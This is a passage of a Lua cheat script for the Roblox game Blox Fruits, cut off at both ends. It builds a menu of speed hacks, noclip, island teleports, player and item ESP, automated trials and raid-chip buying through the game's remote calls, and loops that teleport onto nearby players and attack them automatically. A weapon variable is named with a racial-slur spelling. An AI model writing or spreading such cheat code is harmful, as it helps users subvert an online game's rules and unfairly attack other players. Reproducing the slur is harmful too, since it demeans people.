    Description = "Turn on to protect yourself when health is low",
    Default = false,
    Flag = "Settings/SafeMode",
    Callback = function(Value)
        _G.Safemode = Value
    end
})

task.spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.Safemode then
                local hpPercent = plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth * 100
                if hpPercent < Num_self then
                    shouldTween = true
                    _tp(Root.CFrame * CFrame.new(0, 500, 0))
                else
                    shouldTween = false
                end
            end
        end)
    end
end)

MainRightSection:Toggle({
    Name = "Anti AFK",
    Description = "Prevents Roblox from kicking you for being idle",
    Default = true,
    Flag = "Settings/AntiAFK",
    Callback = function(Value)
        _G.AntiAFK = Value
    end
})

task.spawn(function()
    while task.wait(60) do
        if _G.AntiAFK then
            local virtualUser = game:GetService("VirtualUser")
            virtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            task.wait(1)
            virtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        end
    end
end)

MainRightSection:Toggle({
    Name = "Walk on Water",
    Default = _G.WalkWater_Part or true,
    Flag = "Misc/WalkWater",
    Description = "Turn on Walk on Water",
    Callback = function(Value)
        _G.WalkWater_Part = Value
        local water = game:GetService("Workspace").Map:FindFirstChild("WaterBase-Plane")
        if water then
            water.Size = Value and Vector3.new(1000, 112, 1000) or Vector3.new(1000, 80, 1000)
        end
    end
})





MainRightSection:Toggle({
    Name = "Enable Walkspeed",
    Default = _G.SpeedBoost or false,
    Flag = "Player/SpeedBoost",
    Description = "Turn on Speed Boost",
    Callback = function(Value)
        _G.SpeedBoost = Value
    end
})


_G.SpeedBoost = false
_G.SpeedMultiplier = 330


task.spawn(function()
    while true do
        if _G.SpeedBoost then
            pcall(function()
                local char = game.Players.LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") then
                    local moveDir = char.Humanoid.MoveDirection
                    local hrp = char.HumanoidRootPart
                    
                    if moveDir.Magnitude > 0 then

                        local currentVel = hrp.Velocity
                        local targetSpeed = moveDir.Unit * _G.SpeedMultiplier
                        

                        local smoothSpeed = currentVel:Lerp(
                            Vector3.new(targetSpeed.X, currentVel.Y, targetSpeed.Z), 
                            0.4
                        )
                        

                        hrp.Velocity = smoothSpeed
                    end
                end
            end)
        end

        task.wait(0.03)
    end
end)


MainRightSection:Toggle({
    Name = "Auto Haki",
    Default = true,
    Flag = "AutoHaki",
    Callback = function(Value)
        _G.AutoHaki = Value
        if Value then
            spawn(function()
                while _G.AutoHaki do
                    pcall(function()
                        local char = game:GetService("Players").LocalPlayer.Character
                        if char and not char:FindFirstChild("HasBuso") then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso")
                        end
                    end)
                    wait(1)
                end
            end)
        end
    end
})

MainRightSection:Toggle({
    Name = "NoClip",
    Flag = "Player/NoClip",
    Default = false,
    Callback = function(Value)
        _G.NoClip = Value

        if Value then
            if not _G.NoClipLoop then
                _G.NoClipLoop = task.spawn(function()
                    while _G.NoClip do
                        local char = game.Players.LocalPlayer.Character
                        if char then
                            for _, part in ipairs(char:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    part.CanCollide = false
                                end
                            end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        else
            if _G.NoClipLoop then
                _G.NoClip = false
                _G.NoClipLoop = nil
                local char = game.Players.LocalPlayer.Character
                if char then
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = true
                        end
                    end
                end
            end
        end
    end
})







local Teleport = Library:Tab({ 

    Name = "Teleports" 

})

local TeleportLeftSection = Teleport:Section({ 

    Name = "Teleports", 

    Side = "Left" 
})






local IslandList = {}

if World1 then      
    IslandList = {
        "WindMill", "Marine", "Middle Town", "Jungle", "Pirate Village",
        "Desert", "Snow Island", "MarineFord", "Colosseum", "Sky Island 1",
        "Sky Island 2", "Sky Island 3", "Prison", "Magma Village",
        "Under Water Island", "Fountain City", "Shank Room", "Mob Island"
    }
elseif World2 then
    IslandList = {
        "The Cafe", "Frist Spot", "Dark Area", "Flamingo Mansion", "Flamingo Room",
        "Green Zone", "Factory", "Colossuim", "Zombie Island", "Two Snow Mountain",
        "Punk Hazard", "Cursed Ship", "Ice Castle", "Forgotten Island", 
        "Ussop Island", "Mini Sky Island"
    }
elseif World3 then
    IslandList = {
        "Mansion", "Port Town", "Great Tree", "Castle On The Sea", "MiniSky",
        "Hydra Island", "Floating Turtle", "Haunted Castle", "Ice Cream Island", 
        "Peanut Island", "Cake Island", "Cocoa Island", "Candy Island", "Tiki Outpost"
    }
end

TeleportLeftSection:Dropdown({
    Name = "Select Island",
    Options = IslandList,
    Flag = "Teleport/SelectIsland",
    Callback = function(Selected)
        _G.SelectIsland = Selected
    end
})

TeleportLeftSection:Toggle({
    Name = "Teleport To Island",
    Flag = "Teleport/IslandTP",
    Default = false,
    Callback = function(Value)
        if Value and _G.SelectIsland then
            if _G.SelectIsland == "WindMill" then
                Tween2(CFrame.new(979.79895019531, 16.516613006592, 1429.0466308594))
            elseif (_G.SelectIsland == "Marine") then

Tween2(CFrame.new(- 2566.4296875, 6.8556680679321, 2045.2561035156));

elseif (_G.SelectIsland == "Middle Town") then

Tween2(CFrame.new(- 690.33081054688, 15.09425163269, 1582.2380371094));

elseif (_G.SelectIsland == "Jungle") then

Tween2(CFrame.new(- 1612.7957763672, 36.852081298828, 149.12843322754));

elseif (_G.SelectIsland == "Pirate Village") then

Tween2(CFrame.new(- 1181.3093261719, 4.7514905929565, 3803.5456542969));

elseif (_G.SelectIsland == "Desert") then

Tween2(CFrame.new(944.15789794922, 20.919729232788, 4373.3002929688));

elseif (_G.SelectIsland == "Snow Island") then

Tween2(CFrame.new(1347.8067626953, 104.66806030273, - 1319.7370605469));

elseif (_G.SelectIsland == "MarineFord") then

Tween2(CFrame.new(- 4914.8212890625, 50.963626861572, 4281.0278320313));

elseif (_G.SelectIsland == "Colosseum") then

Tween2(CFrame.new(- 1427.6203613281, 7.2881078720093, - 2792.7722167969));

elseif (_G.SelectIsland == "Sky Island 1") then

Tween2(CFrame.new(- 4869.1025390625, 733.46051025391, - 2667.0180664063));

elseif (_G.SelectIsland == "Sky Island 2") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 4607.82275, 872.54248, - 1667.55688));

elseif (_G.SelectIsland == "Sky Island 3") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 7894.6176757813, 5547.1416015625, - 380.29119873047));

elseif (_G.SelectIsland == "Prison") then

Tween2(CFrame.new(4875.330078125, 5.6519818305969, 734.85021972656));

elseif (_G.SelectIsland == "Magma Village") then

Tween2(CFrame.new(- 5247.7163085938, 12.883934020996, 8504.96875));

elseif (_G.SelectIsland == "Under Water Island") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163.8515625, 11.6796875, 1819.7841796875));

elseif (_G.SelectIsland == "Fountain City") then

Tween2(CFrame.new(5127.1284179688, 59.501365661621, 4105.4458007813));

elseif (_G.SelectIsland == "Shank Room") then

Tween2(CFrame.new(- 1442.16553, 29.8788261, - 28.3547478));

elseif (_G.SelectIsland == "Mob Island") then

Tween2(CFrame.new(- 2850.20068, 7.39224768, 5354.99268));

elseif (_G.SelectIsland == "The Cafe") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 281.93707275390625, 306.130615234375, 609.280029296875));

wait();

Tween2(CFrame.new(- 380.47927856445, 77.220390319824, 255.82550048828));

elseif (_G.SelectIsland == "Frist Spot") then

Tween2(CFrame.new(- 11.311455726624, 29.276733398438, 2771.5224609375));

elseif (_G.SelectIsland == "Dark Area") then

Tween2(CFrame.new(3780.0302734375, 22.652164459229, - 3498.5859375));

elseif (_G.SelectIsland == "Flamingo Mansion") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 281.93707275390625, 306.130615234375, 609.280029296875));

elseif (_G.SelectIsland == "Flamingo Room") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(2284.912109375, 15.152034759521484, 905.48291015625));

elseif (_G.SelectIsland == "Green Zone") then

Tween2(CFrame.new(- 2448.5300292969, 73.016105651855, - 3210.6306152344));

elseif (_G.SelectIsland == "Factory") then

Tween2(CFrame.new(424.12698364258, 211.16171264648, - 427.54049682617));

elseif (_G.SelectIsland == "Colossuim") then

Tween2(CFrame.new(- 1503.6224365234, 219.7956237793, 1369.3101806641));

elseif (_G.SelectIsland == "Zombie Island") then

Tween2(CFrame.new(- 5622.033203125, 492.19604492188, - 781.78552246094));

elseif (_G.SelectIsland == "Two Snow Mountain") then

Tween2(CFrame.new(753.14288330078, 408.23559570313, - 5274.6147460938));

elseif (_G.SelectIsland == "Punk Hazard") then

Tween2(CFrame.new(- 6127.654296875, 15.951762199402, - 5040.2861328125));

elseif (_G.SelectIsland == "Cursed Ship") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.40197753906, 125.05712890625, 32885.875));

elseif (_G.SelectIsland == "Ice Castle") then

Tween2(CFrame.new(6148.4116210938, 294.38687133789, - 6741.1166992188));

elseif (_G.SelectIsland == "Forgotten Island") then

Tween2(CFrame.new(- 3032.7641601563, 317.89672851563, - 10075.373046875));

elseif (_G.SelectIsland == "Ussop Island") then

Tween2(CFrame.new(4816.8618164063, 8.4599885940552, 2863.8195800781));

elseif (_G.SelectIsland == "Mini Sky Island") then

Tween2(CFrame.new(- 288.74060058594, 49326.31640625, - 35248.59375));

elseif (_G.SelectIsland == "Great Tree") then

Tween2(CFrame.new(2681.2736816406, 1682.8092041016, - 7190.9853515625));

elseif (_G.SelectIsland == "Castle On The Sea") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 5075.50927734375, 314.5155029296875, - 3150.0224609375));

elseif (_G.SelectIsland == "MiniSky") then

Tween2(CFrame.new(- 260.65557861328, 49325.8046875, - 35253.5703125));

elseif (_G.SelectIsland == "Port Town") then

Tween2(CFrame.new(- 290.7376708984375, 6.729952812194824, 5343.5537109375));

elseif (_G.SelectIsland == "Hydra Island") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5661.5322265625, 1013.0907592773438, - 334.9649963378906));

elseif (_G.SelectIsland == "Floating Turtle") then

Tween2(CFrame.new(- 13274.528320313, 531.82073974609, - 7579.22265625));

elseif (_G.SelectIsland == "Mansion") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 12468.5380859375, 375.0094299316406, - 7554.62548828125));

elseif (_G.SelectIsland == "Castle On The Sea") then

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 5075.50927734375, 314.5155029296875, - 3150.0224609375));

elseif (_G.SelectIsland == "Haunted Castle") then

Tween2(CFrame.new(- 9515.3720703125, 164.00624084473, 5786.0610351562));

elseif (_G.SelectIsland == "Ice Cream Island") then

Tween2(CFrame.new(- 902.56817626953, 79.93204498291, - 10988.84765625));

elseif (_G.SelectIsland == "Peanut Island") then

Tween2(CFrame.new(- 2062.7475585938, 50.473892211914, - 10232.568359375));

elseif (_G.SelectIsland == "Cake Island") then

Tween2(CFrame.new(- 1884.7747802734375, 19.327526092529297, - 11666.8974609375));

elseif (_G.SelectIsland == "Cocoa Island") then

Tween2(CFrame.new(87.94276428222656, 73.55451202392578, - 12319.46484375));

elseif (_G.SelectIsland == "Candy Island") then

Tween2(CFrame.new(- 1014.4241943359375, 149.11068725585938, - 14555.962890625));

elseif (_G.SelectIsland == "Tiki Outpost") then

Tween2(CFrame.new(- 16542.447265625, 55.68632888793945, 1044.41650390625));
            end
        end
    end
})


-- Rigt Section TP
local TeleportRightSection = Teleport:Section({ 

    Name = "Sea Travel", 

    Side = "Right" 
})


TeleportRightSection:Button({
    Name = "Travel East Blue (World 1)",
    Callback = function()
        replicated.Remotes.CommF_:InvokeServer("TravelMain")
    end
})

TeleportRightSection:Button({
    Name = "Travel Dressrosa (World 2)",
    Callback = function()
        replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
    end
})

TeleportRightSection:Button({
    Name = "Travel Zou (World 3)",
    Callback = function()
        replicated.Remotes.CommF_:InvokeServer("TravelZou")
    end
})


local Player = Library:Tab({ 

    Name = "Visual & Fruits" 

})

local PlayerLeftSection = Player:Section({ 

    Name = "Visual", 

    Side = "Left" 
})


PlayerLeftSection:Toggle({
    Name = "Esp Berries",
    Flag = "Berries",
    Default = false,
    Callback = function(Value)
        BerryEsp = Value
        if BerryEsp then
            task.spawn(function()
                while BerryEsp do
                    wait()
                    berriesEsp()
                end
            end)
        end
    end
})


PlayerLeftSection:Toggle({
    Name = "Esp Players",
    Flag = "Players",
    Default = false,
    Callback = function(Value)
        PlayerEsp = Value
        if PlayerEsp then
            task.spawn(function()
                while PlayerEsp do
                    wait()
                    EspPly()
                end
            end)
        end
    end
})

PlayerLeftSection:Toggle({
    Name = "Esp Chest",
    Flag = "Chest",
    Default = false,
    Callback = function(Value)
        ChestESP = Value
        if ChestESP then
            task.spawn(function()
                while ChestESP do
                    wait()
                    ChestEsp()
                end
            end)
        end
    end
})

PlayerLeftSection:Toggle({
    Name = "Esp Fruits",
    Flag = "Fruits",
    Default = false,
    Callback = function(Value)
        DevilFruitESP = Value
        if DevilFruitESP then
            task.spawn(function()
                while DevilFruitESP do
                    wait()
                    DevEsp()
                end
            end)
        end
    end
})

PlayerLeftSection:Toggle({
    Name = "Esp Island",
    Flag = "Island",
    Default = false,
    Callback = function(Value)
        IslandESP = Value
        if IslandESP then
            task.spawn(function()
                while IslandESP do
                    wait()
                    LocationEsp()
                end
            end)
        end
    end
})


if World2 then
    PlayerLeftSection:Toggle({
        Name = "Esp Flower",
        Flag = "Flower",
        Default = false,
        Callback = function(Value)
            FlowerESP = Value
            if FlowerESP then
                task.spawn(function()
                    while FlowerESP do
                        wait()
                        flowerEsp()
                    end
                end)
            end
        end
    })

    PlayerLeftSection:Toggle({
        Name = "Esp Legendary Sword",
        Flag = "Sword",
        Default = false,
        Callback = function(Value)
            LegenS = Value
            if LegenS then
                task.spawn(function()
                    while LegenS do
                        wait()
                        LegenSword()
                    end
                end)
            end
        end
    })
end


local PlayerRightSection = Player:Section({ 

    Name = "Fruit Stack", 

    Side = "Right" 
})







PlayerRightSection:Toggle({
    Name = "Auto Spin Fruit",
    Flag = "Spin",
    Default = false,
    Callback = function(Value)
        _G.Random_Auto = Value
    end
})

spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Random_Auto then
                replicated.Remotes.CommF_:InvokeServer('Cousin', 'Buy')
            end
        end)
    end
end)

PlayerRightSection:Toggle({
    Name = "Auto Drop Fruit",
    Flag = "Drop",
    Default = false,
    Callback = function(Value)
        _G.DropFruit = Value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.DropFruit then
            pcall(function()
                DropFruits()
            end)
        end
    end
end)

PlayerRightSection:Toggle({
    Name = "Auto Store Fruit",
    Flag = "Store",
    Default = false,
    Callback = function(Value)
        _G.StoreF = Value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.StoreF then
            pcall(function()
                UpdStFruit()
            end)
        end
    end
end)

PlayerRightSection:Toggle({
    Name = "Auto Tween Fruit",
    Flag = "Tween",
    Default = false,
    Callback = function(Value)
        _G.TwFruits = Value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.TwFruits then
            pcall(function()
                for cg, ch in pairs(workspace:GetChildren()) do
                    if string.find(ch.Name, 'Fruit') then
                        _tp(ch.Handle.CFrame)
                    end
                end
            end)
        end
    end
end)

PlayerRightSection:Toggle({
    Name = "Auto Instant Collect Fruit",
    Flag = "Instant",
    Default = false,
    Callback = function(Value)
        _G.InstanceF = Value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.InstanceF then
            pcall(function()
                collectFruits(_G.InstanceF)
            end)
        end
    end
end)


local Trial = Library:Tab({ 

    Name = "Trials & Raids" 

})

local TrialLeftSection = Trial:Section({ 

    Name = "Race", 

    Side = "Left" 
})


TrialLeftSection:Toggle({
    Name = "Teleport Temple Of Time",
    Flag = "Temple",
    Default = false,
    Callback = function(Value)
        if Value then
            for _, v in ipairs(game.ReplicatedStorage.MapStash:GetChildren()) do
                v.Parent = workspace.Map
            end
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", workspace.Map["Temple of Time"].TeleportSpawn.Position)
        end
    end
})

TrialLeftSection:Toggle({
    Name = "Teleport To Lever",
    Flag = "Lever",
    Default = false,
    Callback = function(Value)
        if Value then
            for _, v in ipairs(game.ReplicatedStorage.MapStash:GetChildren()) do
                v.Parent = workspace.Map
            end
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", workspace.Map["Temple of Time"].TeleportSpawn.Position)
            Tween3(CFrame.new(28575.181640625, 14936.6279296875, 72.31636810302734))
        end
    end
})

TrialLeftSection:Toggle({
    Name = "Teleport To Ancient One",
    Flag = "Ancient",
    Default = false,
    Callback = function(Value)
        if Value then
            for _, v in ipairs(game.ReplicatedStorage.MapStash:GetChildren()) do
                v.Parent = workspace.Map
            end
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", workspace.Map["Temple of Time"].TeleportSpawn.Position)
            Tween3(CFrame.new(28981.552734375, 14888.4267578125, -120.245849609375))
        end
    end
})

TrialLeftSection:Toggle({
    Name = "Teleport To Clock Of Time",
    Flag = "Clock",
    Default = false,
    Callback = function(Value)
        if Value then
            for _, v in ipairs(game.ReplicatedStorage.MapStash:GetChildren()) do
                v.Parent = workspace.Map
            end
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", workspace.Map["Temple of Time"].TeleportSpawn.Position)
            Tween3(CFrame.new(29536.826171875, 15068.751953125, -86.30783081054688));
        end
    end
})




TrialLeftSection:Toggle({
    Name = "Teleport To Race Door",
    Flag = "Race",
    Default = false,
    Callback = function(Value)
        if Value then
            for _, v in ipairs(game.ReplicatedStorage.MapStash:GetChildren()) do
                v.Parent = workspace.Map
            end
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", workspace.Map["Temple of Time"].TeleportSpawn.Position)
            if game:GetService("Players").LocalPlayer.Data.Race.Value == "Human" then
                Tween3(CFrame.new(29221.822265625, 14890.9755859375, -205.99114990234375))
            elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Skypiea" then
                Tween3(CFrame.new(28960.158203125, 14919.6240234375, 235.03948974609375))
            elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Fishman" then
                Tween3(CFrame.new(28231.17578125, 14890.9755859375, -211.64173889160156))
            elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Cyborg" then
                Tween3(CFrame.new(28502.681640625, 14895.9755859375, -423.7279357910156))
            elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Ghoul" then
                Tween3(CFrame.new(28674.244140625, 14890.6767578125, 445.4310607910156))
            elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Mink" then
                Tween3(CFrame.new(29012.341796875, 14890.9755859375, -380.1492614746094))
            end
        end
    end
})


local TrialDownLeftSection = Trial:Section({ 

    Name = "Race V4", 

    Side = "Left" 
})



TrialDownLeftSection:Dropdown({
    Name = "Choose Combat Kill Player Trial",
    Options = { "Melee", "Sword", "Gun", "Blox Fruit" },
    Flag = "CombatPlayer",
    Callback = function(Selected)
        _G.NegaWP = Selected
    end
})

spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.NegaWP == 'Melee' then
                for ap, aq in pairs(plr.Backpack:GetChildren()) do
                    if aq.ToolTip == 'Melee' then
                        if plr.Backpack:FindFirstChild(tostring(aq.Name)) then
                            _G.SelectNiger = aq.Name
                        end
                    end
                end
            elseif _G.NegaWP == 'Sword' then
                for ap, aq in pairs(plr.Backpack:GetChildren()) do
                    if aq.ToolTip == 'Sword' then
                        if plr.Backpack:FindFirstChild(tostring(aq.Name)) then
                            _G.SelectNiger = aq.Name
                        end
                    end
                end
            elseif _G.NegaWP == 'Gun' then
                for ap, aq in pairs(plr.Backpack:GetChildren()) do
                    if aq.ToolTip == 'Gun' then
                        if plr.Backpack:FindFirstChild(tostring(aq.Name)) then
                            _G.SelectNiger = aq.Name
                        end
                    end
                end
            elseif _G.NegaWP == 'Blox Fruit' then
                for ap, aq in pairs(plr.Backpack:GetChildren()) do
                    if aq.ToolTip == 'Blox Fruit' then
                        if plr.Backpack:FindFirstChild(tostring(aq.Name)) then
                            _G.SelectNiger = aq.Name
                        end
                    end
                end
            end
        end)
    end
end)




TrialDownLeftSection:Toggle({
    Name = "Auto Trial Race",
    Flag = "RaceTrial",
    Default = false,
    Callback = function(Value)
        _G.Complete_Trials = Value
    end
})

-- Get Sea Beast for Fishman Trial
GetSeaBeastTrial = function()
    if not workspace.Map:FindFirstChild('FishmanTrial') then return nil end
    local FishmanTrial = workspace._WorldOrigin.Locations:FindFirstChild('Trial of Water')
    if FishmanTrial then
        for _, beast in ipairs(workspace.SeaBeasts:GetChildren()) do
            if beast:FindFirstChild('HumanoidRootPart') and (beast.HumanoidRootPart.Position - FishmanTrial.Position).Magnitude <= 1500 then
                if beast:FindFirstChild("Health") and beast.Health.Value > 0 then
                    return beast
                end
            end
        end
    end
end

-- Mink Trial
spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.Complete_Trials and tostring(plr.Data.Race.Value) == 'Mink' then
                notween(workspace.Map.MinkTrial.Ceiling.CFrame * CFrame.new(0, -20, 0))
            end
        end)
    end
end)

-- Fishman Trial
spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.Complete_Trials and tostring(plr.Data.Race.Value) == 'Fishman' then
                local beast = GetSeaBeastTrial()
                if beast then
                    repeat
                        task.wait()
                        spawn(function()
                            _tp(CFrame.new(beast.HumanoidRootPart.Position.X, workspace.Map['WaterBase-Plane'].Position.Y + 300, beast.HumanoidRootPart.Position.Z))
                        end)
                        MousePos = beast.HumanoidRootPart.Position
                        Useskills('Melee', 'Z')
                        Useskills('Melee', 'X')
                        Useskills('Melee', 'C')
                        wait(0.1)
                        Useskills('Sword', 'Z')
                        Useskills('Sword', 'X')
                        wait(0.1)
                        Useskills('Blox Fruit', 'Z')
                        Useskills('Blox Fruit', 'X')
                        Useskills('Blox Fruit', 'C')
                        wait(0.1)
                        Useskills('Gun', 'Z')
                        Useskills('Gun', 'X')
                    until not _G.Complete_Trials or not GetSeaBeastTrial()
                end
            end
        end)
    end
end)

-- Cyborg Trial
spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.Complete_Trials and tostring(plr.Data.Race.Value) == 'Cyborg' then
                _tp(workspace.Map.CyborgTrial.Floor.CFrame * CFrame.new(0, 500, 0))
            end
        end)
    end
end)

-- Skypiea Trial
spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.Complete_Trials and tostring(plr.Data.Race.Value) == 'Skypiea' then
                notween(workspace.Map.SkyTrial.Model.FinishPart.CFrame)
            end
        end)
    end
end)

-- Human and Ghoul Trial
spawn(function()
    while task.wait(0.1) do
        pcall(function()
            if _G.Complete_Trials then
                local race = tostring(plr.Data.Race.Value)
                if race == 'Human' or race == 'Ghoul' then
                    local targets = { 'Ancient Vampire', 'Ancient Zombie' }
                    local enemy = GetConnectionEnemies(targets)
                    if enemy then
                        repeat
                            task.wait()
                            m.Kill(enemy, _G.Complete_Trials)
                        until not _G.Complete_Trials or not enemy.Parent or enemy.Humanoid.Health <= 0
                    end
                end
            end
        end)
    end
end)





TrialDownLeftSection:Toggle({
    Name = "Auto Kill Player After Trial",
    Flag = "KillPlayerTrial",
    Default = false,
    Callback = function(v)
        _G.Defeating = v

        -- Disconnect old loop if it exists
        if getgenv().DefeatLoop then
            getgenv().DefeatLoop:Disconnect()
            getgenv().DefeatLoop = nil
        end

        -- Start new loop if enabled
        if v then
            getgenv().DefeatLoop = game:GetService("RunService").Heartbeat:Connect(function()
                pcall(function()
                    if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then return end
                    local Root = plr.Character.HumanoidRootPart

                    local closestEnemy, closestDistance = nil, 250

                    for _, bE in pairs(workspace.Characters:GetChildren()) do
                        if bE.Name ~= plr.Name and bE:FindFirstChild("Humanoid") and bE:FindFirstChild("HumanoidRootPart") and bE.Humanoid.Health > 0 then
                            local distance = (Root.Position - bE.HumanoidRootPart.Position).Magnitude
                            if distance <= closestDistance then
                                closestEnemy = bE
                                closestDistance = distance
                            end
                        end
                    end

                    if closestEnemy then
                        local hrp = closestEnemy:FindFirstChild("HumanoidRootPart")
                        local hum = closestEnemy:FindFirstChild("Humanoid")

                        if hrp and hum and hum.Health > 0 then
                            EquipWeapon(_G.SelectNiger)
                            _tp(hrp.CFrame * CFrame.new(0, 0, 15))
                            sethiddenproperty(plr, 'SimulationRadius', math.huge)
                        end
                    end
                end)
            end)
        end
    end
})


TrialDownLeftSection:Toggle({
    Name = "Auto Kill Player After Trial Using Fruit And Skills",
    Flag = "FruitSkill",
    Default = false,
    Callback = function(v)
        _G.Kid = v

        -- Disconnect old loop if it exists
        if getgenv().DefeatLoop then
            getgenv().DefeatLoop:Disconnect()
            getgenv().DefeatLoop = nil
        end

        -- Start new loop if enabled
        if v then
            getgenv().DefeatLoop = game:GetService("RunService").Heartbeat:Connect(function()
                pcall(function()
                    if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then return end
                    local Root = plr.Character.HumanoidRootPart

                    local closestEnemy, closestDistance = nil, 250

                    for _, bE in pairs(workspace.Characters:GetChildren()) do
                        if bE.Name ~= plr.Name and bE:FindFirstChild("Humanoid") and bE:FindFirstChild("HumanoidRootPart") and bE.Humanoid.Health > 0 then
                            local distance = (Root.Position - bE.HumanoidRootPart.Position).Magnitude
                            if distance <= closestDistance then
                                closestEnemy = bE
                                closestDistance = distance
                            end
                        end
                    end

                    if closestEnemy then
                        local hrp = closestEnemy:FindFirstChild("HumanoidRootPart")
                        local hum = closestEnemy:FindFirstChild("Humanoid")

                        if hrp and hum and hum.Health > 0 then
                            EquipWeapon(_G.SelectNiger)

                            -- Follow and stay behind the player
                            Root.CFrame = hrp.CFrame * CFrame.new(0, 0, 5)

                            -- Auto use skills
                            Useskills('Blox Fruit', 'Z')
                            Useskills('Blox Fruit', 'X')
                            Useskills('Blox Fruit', 'C')
                            Useskills('Blox Fruit', 'F')

                            sethiddenproperty(plr, 'SimulationRadius', math.huge)
                        end
                    end
                end)
            end)
        end
    end
})





local TrialRightSection = Trial:Section({ 

    Name = "Raids", 

    Side = "Right" 
})





chipList = {
    "Flame",
    "Ice",
    "Quake",
    "Light",
    "Dark",
    "String",
    "Rumble",
    "Magma",
    "Human: Buddha",
    "Sand",
    "Bird: Phoenix",
    "Dough"
}

TrialRightSection:Dropdown({
    Name = "Select Raid Chip",
    Options = chipList,
    Flag = "Select Chip",
    Callback = function(value)
        _G.SelectChip = value
    end
})

TrialRightSection:Toggle({
    Name = "Auto Select Raid Chip",
    Flag = "AutoSelectChip",
    Default = false,
    Callback = function(Value)
        _G.AutoSelectDungeon = Value
    end
})

spawn(function()
    while task.wait(Sec) do
        if _G.AutoSelectDungeon then
            pcall(function()
                if GetBP("Flame-Flame") then
                    _G.SelectChip = "Flame"
                elseif GetBP("Ice-Ice") then
                    _G.SelectChip = "Ice"
                elseif GetBP("Quake-Quake") then
                    _G.SelectChip = "Quake"
                elseif GetBP("Light-Light") then
                    _G.SelectChip = "Light"
                elseif GetBP("Dark-Dark") then
                    _G.SelectChip = "Dark"
                elseif GetBP("String-String") then
                    _G.SelectChip = "String"
                elseif GetBP("Rumble-Rumble") then
                    _G.SelectChip = "Rumble"
                elseif GetBP("Magma-Magma") then
                    _G.SelectChip = "Magma"
                elseif GetBP("Human-Human: Buddha Fruit") then
                    _G.SelectChip = "Human: Buddha"
                elseif GetBP("Dough-Dough") then
                    _G.SelectChip = "Dough"
                elseif GetBP("Sand-Sand") then
                    _G.SelectChip = "Sand"
                elseif GetBP("Bird-Bird: Phoenix") then
                    _G.SelectChip = "Bird: Phoenix"
                else
                    _G.SelectChip = "Ice"
                end
            end)
        end
    end
end)


TrialRightSection:Toggle({
    Name = "Auto Buy Dungeon Chips [Beli]",
    Flag = "BuyDugChips",
    Default = false,
    Callback = function(Value)
        _G.AutoBuyDungeonChip = Value
    end
})

spawn(function()
    while task.wait(Sec) do
        if _G.AutoBuyDungeonChip then
            pcall(function()
                if not GetBP("Special Microchip") and _G.SelectChip then
                    replicated.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", _G.SelectChip)
                end
            end)
        end
    end
end)

TrialRightSection:Toggle({
    Name = "Auto Buy Dungeon Chips [Devil Fruit]",
    Flag = "FruitBuyChip",
    Default = false,
    Callback = function(Value)
        _G.AutoBuyDungeonChipFruit = Value
    end
})

spawn(function()
    while task.wait(Sec) do
        if _G.AutoBuyDungeonChipFruit and not GetBP("Special Microchip") then
            pcall(function()
                local availableFruits = {}
                for _, fruitData in pairs(replicated.Remotes.CommF_:InvokeServer("GetFruits")) do
                    if fruitData.Price <= 490000 then
                        table.insert(availableFruits, fruitData.Name)
                    end
                end

                for _, fruitName in pairs(availableFruits) do
                    for _, validChip in pairs(b) do
                        if not GetBP("Special Microchip") then
                            replicated.Remotes.CommF_:InvokeServer("LoadFruit", tostring(fruitName))
                            replicated.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", _G.SelectChip)
                        end
                    end
                end
            end)
        end
    end
